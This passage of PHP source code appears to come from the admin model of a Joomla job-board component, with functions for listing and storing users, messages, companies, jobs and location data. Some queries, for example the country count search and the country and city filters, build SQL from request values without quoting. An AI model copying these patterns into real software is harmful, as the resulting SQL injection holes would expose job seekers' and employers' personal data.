            $jobjoin = " JOIN #__js_job_jobs AS job ON job.id = message.jobid";
            if ($company)
                $companyjoin = " JOIN #__js_job_companies AS company ON company.id = job.companyid";
        }else
        if ($company)
            $companyjoin = " JOIN #__js_job_jobs AS job ON job.id = message.jobid
                                                    JOIN #__js_job_companies AS company ON company.id = job.companyid";

        $query = "SELECT COUNT(message.id) FROM #__js_job_messages AS message " . $userjoin . $jobjoin . $companyjoin . "
                            WHERE message.status " . $statusoperator . " 0";
        if ($username) {
            $wherequery .= ' AND (LOWER(user.name) LIKE ' . $db->Quote('%' . $username . '%', false) . '
                                             OR LOWER(user.username) LIKE ' . $db->Quote('%' . $username . '%', false) . ') ';
        }
        if ($jobtitle)
            $wherequery .= ' AND LOWER(job.title) LIKE ' . $db->Quote('%' . $jobtitle . '%', false);
        if ($company)
            $wherequery .= ' AND LOWER(company.name) LIKE ' . $db->Quote('%' . $company . '%', false);
        if ($subject)
            $wherequery .= ' AND LOWER(message.subject) LIKE ' . $db->Quote('%' . $subject . '%', false);

        $query .= $wherequery;
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT message.*, job.title as jobtitle, resume.application_title, resume.first_name, resume.middle_name, resume.last_name
                                , empuser.name as employername, jsuser.name as jobseekername, company.name as companyname
				FROM #__js_job_messages AS message
                                " . $userjoin . "
                                JOIN #__users AS empuser ON empuser.id = message.employerid
                                JOIN #__users AS jsuser ON jsuser.id = message.jobseekerid
				JOIN #__js_job_jobs AS job ON job.id = message.jobid
				JOIN #__js_job_resume AS resume ON resume.id = message.resumeid
				JOIN #__js_job_companies AS company ON company.id = job.companyid
				WHERE message.status " . $statusoperator . " 0";
        $query .= $wherequery;
        $query .= " ORDER BY message.created DESC";

        $db->setQuery($query, $limitstart, $limit);
        $messages = $db->loadObjectList();

        $lists = array();

        $usertypes = array(
            '0' => array('value' => 1, 'text' => JText::_('JS_EMPLOYER')),
            '1' => array('value' => 2, 'text' => JText::_('JS_JOB_SEEKER')),);
        $conflict = array(
            '0' => array('value' => 1, 'text' => JText::_('JS_YES')),
            '1' => array('value' => 0, 'text' => JText::_('JS_NO')),);

        if ($username)
            $lists['username'] = $username;
        $lists['usertype'] = JHTML::_('select.genericList', $usertypes, 'message_usertype', 'class="inputbox" ' . '', 'value', 'text', $usertype);
        $lists['conflict'] = JHTML::_('select.genericList', $conflict, 'message_conflicted', 'class="inputbox" ' . '', 'value', 'text', $conflict);
        if ($jobtitle)
            $lists['jobtitle'] = $jobtitle;
        if ($company)
            $lists['company'] = $company;
        if ($subject)
            $lists['subject'] = $subject;


        $result[0] = $messages;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getAllSalaryRange($limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_salaryrange";
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT * FROM #__js_job_salaryrange";

        $db->setQuery($query, $limitstart, $limit);
        $this->_application = $db->loadObjectList();

        $result[0] = $this->_application;
        $result[1] = $total;
        return $result;
    }

    function & getAllRoles($limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_roles";
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT * FROM #__js_job_roles ORDER BY id ASC";

        $db->setQuery($query, $limitstart, $limit);

        $result[0] = $db->loadObjectList();
        $result[1] = $total;
        return $result;
    }

    function & getAllUsers($searchname, $searchusername, $searchcompany, $searchresume, $searchrole, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();

        $query = 'SELECT COUNT(DISTINCT a.id)'
                . ' FROM #__users AS a'
                . ' LEFT JOIN #__js_job_userroles AS usr ON usr.uid = a.id '
                . ' LEFT JOIN #__js_job_roles AS role ON role.id = usr.role
			 LEFT JOIN #__js_job_companies AS company ON company.uid = a.id
			 LEFT JOIN #__js_job_resume AS resume ON resume.uid = a.id ';

        $clause = ' WHERE ';
        if ($searchname) {
            $query .= $clause . ' LOWER(a.name) LIKE ' . $db->Quote('%' . $searchname . '%', false);
            $clause = 'AND';
        }
        if ($searchusername) {
            $query .= $clause . ' LOWER(a.username) LIKE ' . $db->Quote('%' . $searchusername . '%', false);
            $clause = 'AND';
        }
        if ($searchcompany) {
            $query .= $clause . ' LOWER(company.name) LIKE ' . $db->Quote('%' . $searchcompany . '%', false);
            $clause = 'AND';
        }
        if ($searchresume) {
            $query .= $clause . ' ( LOWER(resume.first_name) LIKE ' . $db->Quote('%' . $searchresume . '%', false) . '
                                            OR LOWER(resume.last_name) LIKE ' . $db->Quote('%' . $searchresume . '%', false) . '
                                            OR LOWER(resume.middle_name) LIKE ' . $db->Quote('%' . $searchresume . '%', false) . ' )';
            $clause = 'AND';
        }
        if ($searchrole)
            $query .= $clause . ' LOWER( role.title) LIKE ' . $db->Quote('%' . $searchrole . '%', false);

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;
        $version = new JVersion;
        $joomla = $version->getShortVersion();
        $jversion = substr($joomla, 0, 3);

        if ($jversion == '1.5') {
            $query = 'SELECT a.*, g.name AS groupname, role.title AS roletitle,
                                     company.name AS companyname, resume.first_name, resume.last_name'
                    . ' FROM #__users AS a'
                    . ' INNER JOIN #__core_acl_aro AS aro ON aro.value = a.id'
                    . ' INNER JOIN #__core_acl_groups_aro_map AS gm ON gm.aro_id = aro.id'
                    . ' INNER JOIN #__core_acl_aro_groups AS g ON g.id = gm.group_id'
                    . ' LEFT JOIN #__js_job_userroles AS usr ON usr.uid = a.id '
                    . ' LEFT JOIN #__js_job_roles AS role ON role.id = usr.role
                             LEFT JOIN #__js_job_companies AS company ON company.uid = a.id
                             LEFT JOIN #__js_job_resume AS resume ON resume.uid = a.id ';
        } else {
            $query = 'SELECT a.*, g.title AS groupname, role.title AS roletitle,
                                     company.name AS companyname, resume.first_name, resume.last_name'
                    . ' FROM #__users AS a'
                    . '	INNER JOIN #__user_usergroup_map AS groupmap ON groupmap.user_id = a.id '
                    . '	INNER JOIN #__usergroups AS g ON g.id = groupmap.group_id '
                    . ' LEFT JOIN #__js_job_userroles AS usr ON usr.uid = a.id '
                    . ' LEFT JOIN #__js_job_roles AS role ON role.id = usr.role
                             LEFT JOIN #__js_job_companies AS company ON company.uid = a.id
                             LEFT JOIN #__js_job_resume AS resume ON resume.uid = a.id ';
        }
        $clause = ' WHERE ';
        if ($searchname) {
            $query .= $clause . ' LOWER(a.name) LIKE ' . $db->Quote('%' . $searchname . '%', false);
            $clause = 'AND';
        }
        if ($searchusername) {
            $query .= $clause . ' LOWER(a.username) LIKE ' . $db->Quote('%' . $searchusername . '%', false);
            $clause = 'AND';
        }
        if ($searchcompany) {
            $query .= $clause . ' LOWER(company.name) LIKE ' . $db->Quote('%' . $searchcompany . '%', false);
            $clause = 'AND';
        }
        if ($searchresume) {
            $query .= $clause . ' ( LOWER(resume.first_name) LIKE ' . $db->Quote('%' . $searchresume . '%', false) . '
                                            OR LOWER(resume.last_name) LIKE ' . $db->Quote('%' . $searchresume . '%', false) . '
                                            OR LOWER(resume.middle_name) LIKE ' . $db->Quote('%' . $searchresume . '%', false) . ' )';
            $clause = 'AND';
        }
        if ($searchrole)
            $query .= $clause . ' LOWER( role.title) LIKE ' . $db->Quote('%' . $searchrole . '%', false);

        $query .= ' GROUP BY a.id';
        $db->setQuery($query, $limitstart, $limit);
        $result[0] = $db->loadObjectList();
 
        $lists = array();
        if ($searchname)
            $lists['searchname'] = $searchname;
        if ($searchusername)
            $lists['searchusername'] = $searchusername;
        if ($searchcompany)
            $lists['searchcompany'] = $searchcompany;
        if ($searchresume)
            $lists['searchresume'] = $searchresume;
        if ($searchrole)
            $lists['searchrole'] = $searchrole;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getUserStats($searchname, $searchusername, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();

        $query = 'SELECT COUNT(a.id)'
                . ' FROM #__users AS a';

        $clause = ' WHERE ';
        if ($searchname) {
            $query .= $clause . ' LOWER(a.name) LIKE ' . $db->Quote('%' . $searchname . '%', false);
            $clause = 'AND';
        }
        if ($searchusername)
            $query .= $clause . ' LOWER(a.username) LIKE ' . $db->Quote('%' . $searchusername . '%', false);

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = 'SELECT a.*,role.rolefor
                    ,(SELECT name FROM #__js_job_companies WHERE uid=a.id limit 1 ) AS companyname
                    ,(SELECT CONCAT(first_name," ",last_name) FROM #__js_job_resume WHERE uid=a.id limit 1 ) AS resumename
                    ,(SELECT count(id) FROM #__js_job_companies WHERE uid=a.id ) AS companies
                    ,(SELECT count(id) FROM #__js_job_jobs WHERE uid=a.id ) AS jobs
                    ,(SELECT count(id) FROM #__js_job_resume WHERE uid=a.id ) AS resumes
                    FROM #__users AS a
                    LEFT JOIN #__js_job_userroles AS userrole ON userrole.uid=a.id
                    LEFT JOIN #__js_job_roles AS role ON role.id=userrole.role';


        $clause = ' WHERE ';
        if ($searchname) {
            $query .= $clause . ' LOWER(a.name) LIKE ' . $db->Quote('%' . $searchname . '%', false);
            $clause = 'AND';
        }
        if ($searchusername)
            $query .= $clause . ' LOWER(a.username) LIKE ' . $db->Quote('%' . $searchusername . '%', false);

        $query .= ' GROUP BY a.id';

        $db->setQuery($query, $limitstart, $limit);
        $result[0] = $db->loadObjectList();

        $lists = array();
        if ($searchname)
            $lists['searchname'] = $searchname;
        if ($searchusername)
            $lists['searchusername'] = $searchusername;

        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getUserStatsCompanies($companyuid, $limitstart, $limit) {
        if (is_numeric($companyuid) == false)
            return false;
        $db = & JFactory :: getDBO();
        $result = array();

        $query = 'SELECT COUNT(company.id)'
                . ' FROM #__js_job_companies AS company
		WHERE company.uid = ' . $companyuid;

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

		$query = 'SELECT company.*,cat.cat_title'
		. ' FROM #__js_job_companies AS company'
		.' JOIN #__js_job_categories AS cat ON cat.id=company.category'
        . ' JOIN #__js_job_countries AS country ON country.id=company.country
		WHERE company.uid = ' . $companyuid;

        $query .= ' ORDER BY company.name';

        $db->setQuery($query, $limitstart, $limit);
        $result[0] = $db->loadObjectList();
        $result[1] = $total;
        return $result;
    }

    function & getUserStatsJobs($jobuid, $limitstart, $limit) {
        if (is_numeric($jobuid) == false)
            return false;
        $db = & JFactory :: getDBO();
        $result = array();

        $query = 'SELECT COUNT(job.id)'
                . ' FROM #__js_job_jobs AS job
		WHERE job.uid = ' . $jobuid;

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;
        $query = 'SELECT job.*,company.name AS companyname,cat.cat_title,jobtype.title AS jobtypetitle'
                . ' FROM #__js_job_jobs AS job'
                . ' LEFT JOIN #__js_job_companies AS company ON company.id=job.companyid'
                . ' LEFT JOIN #__js_job_categories AS cat ON cat.id=job.jobcategory'
                . ' LEFT JOIN #__js_job_jobtypes AS jobtype ON jobtype.id=job.jobtype
		   WHERE job.uid = ' . $jobuid;
        $query .= ' ORDER BY job.title';

        $db->setQuery($query, $limitstart, $limit);
        $result[0] = $db->loadObjectList();
        $result[1] = $total;
        return $result;
    }

    function & getAllCountries($searchname, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM `#__js_job_countries`";
        if ($searchname) {
            $wherequery = " WHERE name LIKE '%" . $searchname . "%' ORDER BY name ASC";
        } else {
            $wherequery = " ORDER BY name ASC";
        }
        $query .= $wherequery;
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT * FROM `#__js_job_countries`";
        if ($searchname) {

            $wherequery = " WHERE name LIKE " . $db->Quote('%' . $searchname . '%', false) . " ORDER BY name ASC";
        } else {
            $wherequery = " ORDER BY name ASC";
        }
        $query .= $wherequery;

        $db->setQuery($query, $limitstart, $limit);

        $result[0] = $db->loadObjectList();
        $result[1] = $total;
        if ($searchname) {
            $lists['searchname'] = $searchname;
            $result[2] = $lists;
        }
        return $result;
    }

    function & getAllCountryStates($searchname, $countryid, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM `#__js_job_states` WHERE countryid = " . $countryid;
        if ($searchname) {
            $query .= " AND name LIKE " . $db->Quote('%' . $searchname . '%', false);
        }
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT * FROM `#__js_job_states` WHERE countryid = " . $countryid;

        if ($searchname) {
            $query .= " AND name LIKE " . $db->Quote('%' . $searchname . '%', false) . " ORDER BY name ASC";
        } else {
            $query .= " ORDER BY name ASC";
        }
        $db->setQuery($query, $limitstart, $limit);

        $result[0] = $db->loadObjectList();
        $result[1] = $total;
        if ($searchname) {
            $lists['searchname'] = $searchname;
            $result[2] = $lists;
        }
        return $result;
    }

    function & getAllStateCounties($searchname, $statecode, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM `#__js_job_counties` WHERE statecode = " . $db->Quote($statecode);
        if ($searchname) {
            $query .= " AND name LIKE " . $db->Quote('%' . $searchname . '%', false);
        }
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT * FROM `#__js_job_counties` WHERE statecode = " . $db->Quote($statecode);

        if ($searchname) {
            $query .= " AND name LIKE " . $db->Quote('%' . $searchname . '%', false) . " ORDER BY name ASC";
        } else {
            $query .= " ORDER BY name ASC";
        }

        $db->setQuery($query, $limitstart, $limit);

        $result[0] = $db->loadObjectList();
        $result[1] = $total;

        if ($searchname) {
            $lists['searchname'] = $searchname;
            $result[2] = $lists;
        }

        return $result;
    }

    function &getAllStatesCities($searchname, $stateid, $countryid, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM `#__js_job_cities`";
        $wherequery = "";
        if ($stateid) {
            if(!is_numeric($stateid)) return false;
            $wherequery = " WHERE stateid = " . $stateid;
        }
        if ($countryid) {
            if (empty($wherequery))
                $wherequery = " WHERE countryid = " . $countryid;
            else
                $wherequery .= " AND countryid = " . $countryid;
        }
        $query .=$wherequery;

        if ($searchname) {
            $query .= " AND name LIKE " . $db->Quote('%' . $searchname . '%', false);
        }
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT * FROM `#__js_job_cities` " . $wherequery;
        if ($searchname) {
            $query .= " AND name LIKE " . $db->Quote('%' . $searchname . '%', false) . " ORDER BY name ASC";
        } else {
            $query .= " ORDER BY name ASC";
        }
		$db->setQuery($query,$limitstart, $limit);
		$result[0] = $db->loadObjectList();
		$result[1] = $total;
		if($searchname){
			$lists['searchname'] = $searchname;
			$result[2] = $lists;
		}
		return $result;
	}
	function & getAllCountyCities($searchname,$countycode, $limitstart, $limit){
		$db = & JFactory :: getDBO();
		$result = array();
		$query = "SELECT COUNT(id) FROM `#__js_job_cities` WHERE countycode = ". $db->Quote($countycode);
                if($searchname){
                    $query .= " AND name LIKE ".$db->Quote( '%'.$searchname.'%', false );
                }
		$db->setQuery($query);
		$total = $db->loadResult();
		if ( $total <= $limitstart ) $limitstart = 0;

		$query = "SELECT * FROM `#__js_job_cities` WHERE countycode = ". $db->Quote($countycode);

                if($searchname){
                    $query .= " AND name LIKE ".$db->Quote( '%'.$searchname.'%', false )." ORDER BY name ASC";
                }else{
                    $query .= " ORDER BY name ASC";
                }

        $db->setQuery($query, $limitstart, $limit);

        $result[0] = $db->loadObjectList();
        $result[1] = $total;
        if ($searchname) {
            $lists['searchname'] = $searchname;
            $result[2] = $lists;
        }
        return $result;
    }

    function & getJobSeekerPackages($limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_jobseekerpackages";
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT * FROM #__js_job_jobseekerpackages ORDER BY id ASC";

        $db->setQuery($query, $limitstart, $limit);
        $packages = $db->loadObjectList();

        $result[0] = $packages;
        $result[1] = $total;
        return $result;
    }

// Get All End
// Store Code Start
    function storeEmployerPackage() {
        $row = & $this->getTable('employerpackage');

        $data = JRequest :: get('post');

        if (!isset($this->_config)) {
            $this->getConfig('');
        }
        foreach ($this->_config as $conf) {
            if ($conf->configname == 'date_format')
                $dateformat = $conf->configvalue;
        }

        if ($dateformat == 'm-d-Y') {
            $arr = explode('-', $data['discountstartdate']);
            $data['discountstartdate'] = $arr[0] . '/' . $arr[1] . '/' . $arr[2];
            $arr = explode('-', $data['discountenddate']);
            $data['discountenddate'] = $arr[0] . '/' . $arr[1] . '/' . $arr[2];
        } elseif ($dateformat == 'd-m-Y') {
            $arr = explode('-', $data['discountstartdate']);
            $data['discountstartdate'] = $arr[2] . '-' . $arr[1] . '-' . $arr[0];
            $arr = explode('-', $data['discountenddate']);
            $data['discountenddate'] = $arr[2] . '-' . $arr[1] . '-' . $arr[0];
        }

        $data['discountstartdate'] = date('Y-m-d H:i:s', strtotime($data['discountstartdate']));
        $data['discountenddate'] = date('Y-m-d H:i:s', strtotime($data['discountenddate']));
        if (!$row->bind($data)) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        }
        if (!$row->store()) {
            $this->setError($this->_db->getErrorMsg());
            echo $this->_db->getErrorMsg();
            return false;
        }
        $methodslinks = $this->storePaymentMethodsLinks($row->id, $data['linkids'], $data['paymentmethodids'], $data['link'], 1);
        return true;
    }

    function storePaymentMethodsLinks($packageid, $linkids, $paymentmethodsid, $links, $packagefor) {

        $row = & $this->getTable('paymentmethodlinks');

        for ($i = 0; $i < count($paymentmethodsid); $i++) {
            if ((!empty($links[$i])) && ($links[$i] != '')) {
                if (isset($linkids[$i]))
                    $row->id = $linkids[$i];
                else
                    $row->id = '';
                $row->packageid = $packageid;
                $row->paymentmethodid = $paymentmethodsid[$i];
                $row->link = $links[$i];
                $row->packagefor = $packagefor; // 1 for employer package link and 2 for jobseeker package link 

                $row->store();
            }
        }
    }

    function storeJobSeekerPackage() {
        $row = & $this->getTable('jobseekerpackage');

        $data = JRequest :: get('post');

        if (!isset($this->_config)) {
            $this->getConfig('');
        }
        foreach ($this->_config as $conf) {
            if ($conf->configname == 'date_format')
                $dateformat = $conf->configvalue;
        }
        if ($dateformat == 'm-d-Y') {
            $arr = explode('-', $data['discountstartdate']);
            $data['discountstartdate'] = $arr[0] . '/' . $arr[1] . '/' . $arr[2];
            $arr = explode('-', $data['discountenddate']);
            $data['discountenddate'] = $arr[0] . '/' . $arr[1] . '/' . $arr[2];
        } elseif ($dateformat == 'd-m-Y') {
            $arr = explode('-', $data['discountstartdate']);
            $data['discountstartdate'] = $arr[2] . '-' . $arr[1] . '-' . $arr[0];
            $arr = explode('-', $data['discountenddate']);
            $data['discountenddate'] = $arr[2] . '-' . $arr[1] . '-' . $arr[0];
        }

        $data['discountstartdate'] = date('Y-m-d H:i:s', strtotime($data['discountstartdate']));
        $data['discountenddate'] = date('Y-m-d H:i:s', strtotime($data['discountenddate']));


        if (!$row->bind($data)) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        }
        if (!$row->store()) {
            $this->setError($this->_db->getErrorMsg());
            echo $this->_db->getErrorMsg();
            return false;
        }
        $methodslinks = $this->storePaymentMethodsLinks($row->id, $data['linkids'], $data['paymentmethodids'], $data['link'], 2);
        return true;
    }

    function storeDepartment() {
        global $resumedata;
        $row = &$this->getTable('department');
        $data = JRequest :: get('post');

        if (!empty($data['alias']))
            $departmentalias = $data['alias'];
        else
            $departmentalias = $data['name'];

        $departmentalias = strtolower(str_replace(' ', '-', $departmentalias));
        $data['alias'] = $departmentalias;

        if ($data['id'] == '')
            $data['created'] = date('Y-m-d H:i:s');

        if (!$row->bind($data)) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        }
        if (!$row->check()) {
            $this->setError($this->_db->getErrorMsg());
            return 2;
        }
        if (!$row->store()) {
            $this->setError($this->_db->getErrorMsg());
            echo $this->_db->getErrorMsg();
            return false;
        }
        if ($this->_client_auth_key != "") {
            $db = &$this->getDBO();
            $query = "SELECT department.* FROM `#__js_job_departments` AS department  
						WHERE department.id = " . $row->id;

            $db->setQuery($query);
            $data_department = $db->loadObject();
            if ($data['id'] != "" AND $data['id'] != 0)
                $data_department->id = $data['id']; // for edit case
            $data_department->department_id = $row->id;
            $data_department->authkey = $this->_client_auth_key;
            $data_department->task = 'storedepartment';
            $jsjobsharingobject = new JSJobsModelJobSharing;
            $return_value = $jsjobsharingobject->storeDepartmentSharing($data_department);
            return $return_value;
        }else {
            return true;
        }
    }

    function storeCompany() {
        $row = &$this->getTable('company');
        $data = JRequest :: get('post');
        $filerealpath = "";

        if (!$this->_config)
            $this->getConfig('');

        foreach ($this->_config as $conf) {
            if ($conf->configname == 'date_format')
                $dateformat = $conf->configvalue;
        }

        if ($dateformat == 'm-d-Y') {
            $arr = explode('-', $data['since']);
            $data['since'] = $arr[0] . '/' . $arr[1] . '/' . $arr[2];
        } elseif ($dateformat == 'd-m-Y') {
            $arr = explode('-', $data['since']);
            $data['since'] = $arr[2] . '-' . $arr[1] . '-' . $arr[0];
        }
        $data['since'] = date('Y-m-d H:i:s', strtotime($data['since']));

        if (!$this->_comp_editor)
            $this->getConfig();
        if ($this->_comp_editor == 1) {
            $data['description'] = JRequest::getVar('description', '', 'post', 'string', JREQUEST_ALLOWRAW);
        }
        $returnvalue = 1;

        // For database
        if ($_FILES['logo']['size'] > 0) { // logo
            $data['logofilename'] = $_FILES['logo']['name']; // file name
            $data['logoisfile'] = 1; // logo store in file system
        }
        if ($data['deletelogo'] == 1) { // delete logo
            $data['logofilename'] = ''; // file name
            $data['logoisfile'] = -1; // no logo
        }

        if ($_FILES['smalllogo']['size'] > 0) { //small logo
            $data['smalllogofilename'] = $_FILES['smalllogo']['name']; // file name
            $data['smalllogoisfile'] = 1; // logo store in file system
        }
        if ($data['deletesmalllogo'] == 1) { //delete small logo
            $data['smalllogofilename'] = ''; // file name
            $data['smalllogoisfile'] = -1; // no logo
        }

        if ($_FILES['aboutcompany']['size'] > 0) { //about company
            $data['aboutcompanyfilename'] = $_FILES['aboutcompany']['name']; // file name
            $data['aboutcompanyisfile'] = 1; // logo store in file system
        }
        if ($data['deleteaboutcompany'] == 1) { // delete about company
            $data['aboutcompanyfilename'] = ''; // file name
            $data['aboutcompanyisfile'] = -1; // no logo
        }
        if (!empty($data['alias']))
            $companyalias = $data['alias'];
        else
            $companyalias = $data['name'];

        $companyalias = strtolower(str_replace(' ', '-', $companyalias));
        $data['alias'] = $companyalias;


        if (!$row->bind($data)) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        }
        if (!$row->check()) {
            $this->setError($this->_db->getErrorMsg());
            return 2;
        }
        if (!$row->store()) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        }

        $this->storeUserFieldData($data, $row->id);

        // For file upload
        $companyid = $row->id;
        $filetypemismatch = 0;
        if ($_FILES['logo']['size'] > 0) { // logo
            $returnvalue = $this->uploadFile($companyid, 1, 0);
            if ($returnvalue == 6)
                $filetypemismatch = 1;
            $filerealpath = $returnvalue;
        }
        if ($data['deletelogo'] == 1) { // delete logo
            $returnvalue = $this->uploadFile($companyid, 1, 1);
            if ($returnvalue == 6)
                $filetypemismatch = 1;
        }

        if ($_FILES['smalllogo']['size'] > 0) { //small logo
            $returnvalue = $this->uploadFile($companyid, 2, 0);
            if ($returnvalue == 6)
                $filetypemismatch = 1;
        }
        if ($data['deletesmalllogo'] == 1) { //delete small logo
            $returnvalue = $this->uploadFile($companyid, 2, 1);
            if ($returnvalue == 6)
                $filetypemismatch = 1;
        }

        if ($_FILES['aboutcompany']['size'] > 0) { //about company
            $returnvalue = $this->uploadFile($companyid, 3, 0);
            if ($returnvalue == 6)
                $filetypemismatch = 1;
        }
        if ($data['deleteaboutcompany'] == 1) { // delete about company
            $returnvalue = $this->uploadFile($companyid, 3, 1);
            if ($returnvalue == 6)
                $filetypemismatch = 1;
        }
        if ($data['city'])
            $storemulticity = $this->storeMultiCitiesCompany($data['city'], $row->id);
        if (isset($storemulticity) AND ($storemulticity == false))
            return false;


        if ($this->_client_auth_key != "") {

            $company_logo = array();

            $db = &$this->getDBO();
            $query = "SELECT company.* FROM `#__js_job_companies` AS company  
						WHERE company.id = " . $row->id;

            $db->setQuery($query);
            $data_company = $db->loadObject();
            if ($data['id'] != "" AND $data['id'] != 0)
                $data_company->id = $data['id']; // for edit case
            if ($_FILES['logo']['size'] > 0)
                $company_logo['logofilename'] = $filerealpath;
            $data_company->company_id = $row->id;
            $data_company->authkey = $this->_client_auth_key;
            $data_company->task = 'storecompany';
            $jsjobsharingobject = new JSJobsModelJobSharing;
            $return_value = $jsjobsharingobject->storeCompanySharing($data_company);
            if ($return_value['iscompanystore'] == 0)
                return $return_value;
            if ($filetypemismatch != 1) {
                if ($_FILES['logo']['size'] > 0)
                    $return_value_company_logo = $jsjobsharingobject->storeCompanyLogoSharing($data_company, $company_logo);
            }
            if (is_array($return_value) AND !empty($return_value) AND is_array($return_value_company_logo) AND !empty($return_value_company_logo)) {
                $company_logo_return_value = (array_merge($return_value, $return_value_company_logo));
                return $company_logo_return_value;
            } else {
                return $return_value;
            }
        } else {
            if ($filetypemismatch == 1)
                return 6;
            return true;
        }
    }

    function storeMultiCitiesCompany($city_id, $companyid) { // city id comma seprated 
        $db = & JFactory::getDBO();
        $query = "SELECT cityid FROM #__js_job_companycities WHERE companyid = " . $companyid;
        $db->setQuery($query);
        $old_cities = $db->loadObjectList();

        $id_array = explode(",", $city_id);
        $row = &$this->getTable('companycities');
        $error = array();

        foreach ($old_cities AS $oldcityid) {
            $match = false;
            foreach ($id_array AS $cityid) {
                if ($oldcityid->cityid == $cityid) {
                    $match = true;
                    break;
                }
            }
            if ($match == false) {
                $query = "DELETE FROM #__js_job_companycities WHERE companyid = " . $companyid . " AND cityid=" . $oldcityid->cityid;
                $db->setQuery($query);
                if (!$db->query()) {
                    $err = $this->setError($this->_db->getErrorMsg());
                    $error[] = $err;
                }
            }
        }
        foreach ($id_array AS $cityid) {
            $insert = true;
            foreach ($old_cities AS $oldcityid) {
                if ($oldcityid->cityid == $cityid) {
                    $insert = false;
                    break;
                }
            }
            if ($insert) {
                $row->id = "";
                $row->companyid = $companyid;
                $row->cityid = $cityid;
                if (!$row->store()) {
                    $err = $this->setError($this->_db->getErrorMsg());
                    $error[] = $err;
                }
            }
        }
        if (!empty($error))
            return false;

        return true;
    }

    function storeFolder() {
        $row = &$this->getTable('folder');
        $data = JRequest :: get('post');
        $data['decription'] = JRequest::getVar('decription', '', 'post', 'string', JREQUEST_ALLOWRAW);
        $name = $data['name'];
        if (!empty($data['alias']))
            $folderalias = $data['alias'];
        else
            $folderalias = $data['name'];

        $folderalias = strtolower(str_replace(' ', '-', $folderalias));
        $data['alias'] = $folderalias;
        if ($data['id'] == "")
            if ($this->folderValidation($name))
                return 3;
        $returnvalue = 1;
        if (!$row->bind($data)) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        }
        if (!$row->check()) {
            $this->setError($this->_db->getErrorMsg());
            return 2;
        }
        if (!$row->store()) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        }
        if ($this->_client_auth_key != "") {
            $db = &$this->getDBO();
            $query = "SELECT folder.* FROM `#__js_job_folders` AS folder  
							WHERE folder.id = " . $row->id;

            $db->setQuery($query);
            $data_folder = $db->loadObject();
            if ($data['id'] != "" AND $data['id'] != 0) {
                $query = "select folder.serverid AS serverid 
								From #__js_job_folders AS folder
								WHERE folder.id=" . $data['id'];
                $db->setQuery($query);
                $serverfolder_id = $db->loadResult();
                $data_folder->id = $serverfolder_id; // for edit case
            }
            $data_folder->folder_id = $row->id;
            $data_folder->authkey = $this->_client_auth_key;
            $data_folder->task = 'storefolder';
            $jsjobsharingobject = new JSJobsModelJobSharing;
            $return_value = $jsjobsharingobject->storeFolderSharing($data_folder);
            return $return_value;
        } else {
            return true;
        }
    }

    function folderValidation($foldername) {
        $db = & JFactory:: getDBO();
        $query = "SELECT COUNT(id) FROM #__js_job_folders
		WHERE name = " . $db->Quote($foldername);
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result > 0)
            return true;
        else
            return false;
    }

    function storeJob() {
        $row = &$this->getTable('job');
        $data = JRequest :: get('post');
        $db = &$this->getDBO();

        if (isset($this_config) == false)
            $this->getConfig('');
        foreach ($this->_config as $conf) {
            if ($conf->configname == 'date_format')
                $dateformat = $conf->configvalue;
        }
        if ($dateformat == 'm/d/Y') {
            $arr = explode('/', $data['startpublishing']);
            $data['startpublishing'] = $arr[2] . '/' . $arr[0] . '/' . $arr[1];
            $arr = explode('/', $data['stoppublishing']);
            $data['stoppublishing'] = $arr[2] . '/' . $arr[0] . '/' . $arr[1];
        } elseif ($dateformat == 'd-m-Y' OR $dateformat == 'Y-m-d') {
            $arr = explode('-', $data['startpublishing']);
            $data['startpublishing'] = $arr[2] . '-' . $arr[1] . '-' . $arr[0];
            $arr = explode('-', $data['stoppublishing']);
            $data['stoppublishing'] = $arr[2] . '-' . $arr[1] . '-' . $arr[0];
        }

